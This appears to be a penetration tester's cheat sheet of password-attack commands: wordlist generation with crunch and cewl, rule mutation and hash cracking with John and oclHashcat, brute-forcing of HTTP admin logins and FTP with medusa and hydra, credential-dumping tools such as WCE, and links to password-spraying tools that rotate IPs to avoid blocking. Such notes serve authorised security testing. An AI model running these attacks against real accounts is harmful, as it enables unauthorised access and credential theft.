# Finding Passwords
```
grep -rl hash
grep -rl password
```

# Wordlist creation
```
crunch 6 6 0123456789ABCDEF -o list.txt
crunch 8 8 -t ,@@^^%%%
```
```
/usr/share/crunch/charset.lsr mixalpha -o  mixda.txt
```

# Wordlist using keywords from a site
```
cewl example.com -m 6 -w out.txt
```

# Mutate wordlists
```
/etc/john/john.conf
> $[0-9]$[0-9]
```

```
john --wordlist=out.txt --rules --stdout > mutated.txt
```

# Tools
- pwdump
- fgdump
- windows credential editor (WCE) - Steal NTLM hashes from memory and auth modules

# Password Cracking
```
john hashes.txt
```

# Htaccess

```
medusa -h ip -u admin -P passwords.txt -M http -m DIR:/admin -T 20
```

# FTP
```
hydra  -l admin -P pass.txt -v ip ftp
```

# Basic Auth
```
cewl example.com -m 6 -w /root/mega-cewl.txt 2> /dev/null
john --wordlist=mega-cewl.txt --rules --studout > mega-cewl-mutated.txt
medusa -h admin.example.com -u admin -P mega-cewl-mutated.txt -M http -n 81 -m DIR:/admin -T 30
```

# Salted Hash Cracking

## oclHashcat

oclHashcat input file should be in format: `passwordhash:salt`

```
oclHashcat-plus64.bin -m 110 hashes.txt ../big-wordlist --force
```

# Password Spraying

- Spray: https://github.com/SpiderLabs/Spray
- Password spraying using AWS Lambda for IP rotation: https://github.com/ustayready/CredKing

# Generators
- Common password pattern generator using strings list: https://github.com/localh0t/m4ngl3m3
- A script for generating custom passphrase lists to be used for password cracking with hashcat rules: https://github.com/dafthack/PassphraseGen
- LM, NTLM, Net-NTLMv2, oh my!: https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4
